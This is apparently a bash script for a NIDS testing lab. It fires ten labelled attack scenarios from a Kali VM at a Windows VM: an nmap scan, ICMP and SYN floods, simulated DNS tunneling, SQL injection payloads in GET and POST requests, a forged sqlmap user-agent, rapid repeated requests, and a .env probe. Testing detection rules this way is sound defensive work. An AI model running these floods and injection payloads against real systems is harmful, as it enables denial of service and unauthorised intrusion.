#!/bin/bash
# ============================================================================
#  NIDS Attack Lab — Kali Linux Attack Script
#
#  Network layout:
#    Host  (NIDS)     : 192.168.122.1
#    Kali  (Attacker) : 192.168.122.230
#    Win10 (Victim)   : 192.168.122.54
#
#  Prerequisites:
#    1. Host  — start NIDS with both rule files:
#         sudo .venv/bin/python main.py --iface <iface> \
#              --rules custom.rules --rules custom_test.rules --limit 0
#    2. Win10 — run an HTTP server on port 80:
#         python -m http.server 80
#
#  Requires root (sudo) for nmap and hping3.
# ============================================================================

set -euo pipefail

# --------------- Config ---------------
TARGET_IP="192.168.122.54"   # Win10 Victim
NIDS_IP="192.168.122.1"     # Host running NIDS
ATTACKER_IP="192.168.122.230"
DNS_RELAY="8.8.8.8"         # Relay so traffic crosses virbr0

# --------------- Colors ---------------
R='\033[0;31m'  G='\033[0;32m'  Y='\033[1;33m'  C='\033[0;36m'
B='\033[1;97m'  DIM='\033[2m'   RST='\033[0m'

# --------------- Helpers ---------------
hr()      { echo -e "${C}$(printf '═%.0s' {1..60})${RST}"; }
blank()   { echo ""; }

begin_scenario() {
    # $1 = number, $2 = title, $3 = rule, $4 = description
    blank; hr
    echo -e " ${R}▸ Kịch bản $1${RST}  ${B}$2${RST}"
    echo -e "   ${DIM}Luật: $3${RST}"
    echo -e "   ${DIM}$4${RST}"
    hr
}

end_scenario() {
    echo -e " ${G}✔ Kịch bản $1 hoàn tất.${RST}"
}

pause_between() {
    echo -e " ${Y}⏳ Đợi 5 s...${RST}"
    sleep 5
}

# ========================  BEHAVIOR-BASED  ==================================

scenario_1() {
    begin_scenario 1 "Nmap Port Scan" "RULE-001 (≥20 TCP ports / 10 s)" \
        "SYN scan 20 ports — T4, --scan-delay 5 ms"
    sudo nmap -sS \
        -p 21,22,23,25,53,80,110,135,139,143,443,445,1433,3306,3389,8080,8443,8888,9090,9200 \
        --scan-delay 5ms -T4 -n --open --max-retries 0 \
        "$TARGET_IP"
    end_scenario 1
}

scenario_2() {
    begin_scenario 2 "ICMP Ping Flood" "RULE-002 (≥100 ICMP req / 10 s)" \
        "120 Echo Requests, interval 50 ms"
    sudo hping3 --icmp -c 120 -i u50000 "$TARGET_IP"
    end_scenario 2
}

scenario_3() {
    begin_scenario 3 "TCP SYN Flood" "RULE-003 (≥100 SYN / 10 s → port 80)" \
        "120 SYN packets to port 80, interval 50 ms"
    sudo hping3 -S -p 80 -c 120 -i u50000 "$TARGET_IP"
    end_scenario 3
}

scenario_4() {
    begin_scenario 4 "DNS Tunneling" "RULE-004 (≥5 suspicious queries / 30 s)" \
        "7 queries with high-entropy labels (45–56 chars each)"

    # Labels: 45–63 chars, base64 strings → high entropy, long subdomain
    local labels=(
        "aGVsbG93b3JsZGhlbGxvd29ybGRoZWxsb3dvcmxkaGVsbG93b3JsZA"
        "dGhpcWlzYXZlcnlsb25nc3ViZG9tYWlubGFiZWxmb3J0ZXN0aW5n"
        "c3VzcGljaW91c2Ruc3F1ZXJ5Zm9ybmlkc2RlbW9wcm9qZWN0dGVzdA"
        "ZGF0YWV4ZmlsdHJhdGlvbnZpYWRuc3R1bm5lbGluZ2RlbW90ZXN0cQ"
        "bmlkc3Byb2plY3RkZW1vYXR0YWNrc2ltdWxhdGlvbnRlc3RsYWJlbA"
        "c2VtZXN0ZXJwcm9qZWN0aW50cnVzaW9uZGV0ZWN0aW9uc3lzdGVtdA"
        "aW50cnVzaW9uZGV0ZWN0aW9uc3lzdGVtZGVtb3Rlc3RsYWJlbHNnbg"
    )
    for lbl in "${labels[@]}"; do
        echo -e "   ${DIM}dig ${lbl:0:30}…tunnel.example.com${RST}"
        dig +short +time=1 +tries=1 "${lbl}.tunnel.example.com" @"$DNS_RELAY" 2>/dev/null
        sleep 0.4
    done
    end_scenario 4
}

# ========================  SIGNATURE-BASED  =================================

scenario_5() {
    begin_scenario 5 "Custom DNS Signature" "SID 1000101 (dns.query ∋ 'example.com')" \
        "Single dig query for example.com"
    dig example.com @"$DNS_RELAY"
    end_scenario 5
}

scenario_6() {
    begin_scenario 6 "sqlmap User-Agent" "SID 1000002 (http.user_agent ∋ 'sqlmap')" \
        "HTTP GET with forged sqlmap UA string"
    curl -s -A "sqlmap/1.8.2#stable (https://sqlmap.org)" \
        "http://$TARGET_IP/" | head -20
    end_scenario 6
}

scenario_7() {
    begin_scenario 7 "SQL Injection — GET" "SID 1000001 (http.uri ∋ SQLi pattern)" \
        "URL-encoded ' OR '1'='1 in query string"
    curl -s "http://$TARGET_IP/index.php?id=%27%20OR%20%271%27%3D%271" | head -20
    end_scenario 7
}

scenario_8() {
    begin_scenario 8 "SQL Injection — POST" "SID 1000003 (pkt_data ∋ SQLi pattern)" \
        "POST body with ' OR '1'='1"
    curl -s -X POST "http://$TARGET_IP/login" \
        --data "username=admin&password=' OR '1'='1" | head -20
    end_scenario 8
}

scenario_9() {
    begin_scenario 9 "Brute Force Detection" "SID 900004 (detection_filter: ≥5 GET / 10 s)" \
        "10 rapid-fire GET requests"
    for i in $(seq 1 10); do
        printf "   request #%-2d → " "$i"
        curl -s "http://$TARGET_IP/" -o /dev/null -w "HTTP %{http_code}\n"
        sleep 0.3
    done
    end_scenario 9
}

scenario_10() {
    begin_scenario 10 ".env File Access" "SID 1000005 (http.uri ∋ '.env')" \
        "GET /.env — sensitive config probe"
    curl -s "http://$TARGET_IP/.env" | head -20
    end_scenario 10
}

# ========================  MENU  ============================================

show_menu() {
    clear 2>/dev/null || true
    blank; hr
    echo -e "  ${B}NIDS ATTACK LAB — KALI LINUX${RST}"
    hr
    echo -e "  NIDS     ${G}$NIDS_IP${RST}"
    echo -e "  Attacker ${R}$ATTACKER_IP${RST}"
    echo -e "  Victim   ${R}$TARGET_IP${RST}"
    hr; blank

    echo -e "  ${C}── Behavior-based ──${RST}"
    echo "   1) Nmap Port Scan          (RULE-001)"
    echo "   2) ICMP Ping Flood         (RULE-002)"
    echo "   3) TCP SYN Flood           (RULE-003)"
    echo "   4) DNS Tunneling           (RULE-004)"
    blank
    echo -e "  ${C}── Signature-based ──${RST}"
    echo "   5) Custom DNS Signature    (SID 1000101)"
    echo "   6) sqlmap User-Agent       (SID 1000002)"
    echo "   7) SQL Injection GET       (SID 1000001)"
    echo "   8) SQL Injection POST      (SID 1000003)"
    echo "   9) Brute Force Detection   (SID 900004)"
    echo "  10) .env File Access        (SID 1000005)"
    blank
    echo -e "  ${Y} A) Chạy tất cả tuần tự${RST}"
    echo "   0) Thoát"
    blank
}

run_all() {
    echo -e "${Y}▸ Chạy tuần tự 10 kịch bản…${RST}"
    for i in $(seq 1 10); do
        "scenario_$i"
        [[ $i -lt 10 ]] && pause_between
    done
    blank; hr
    echo -e " ${G}✔ HOÀN TẤT TẤT CẢ 10 KỊCH BẢN${RST}"
    echo -e " ${Y}→ Xem cảnh báo: http://$NIDS_IP:5000${RST}"
}

# ========================  MAIN  ============================================

show_menu
read -rp "Chọn (0-10 / A): " choice

case "${choice,,}" in   # lowercase
    a)
        run_all
        ;;
    0)
        echo "Thoát."; exit 0
        ;;
    [1-9]|10)
        "scenario_$choice"
        blank; hr
        echo -e " ${Y}→ Xem cảnh báo: http://$NIDS_IP:5000${RST}"
        ;;
    *)
        echo -e "${R}Lựa chọn không hợp lệ!${RST}"; exit 1
        ;;
esac
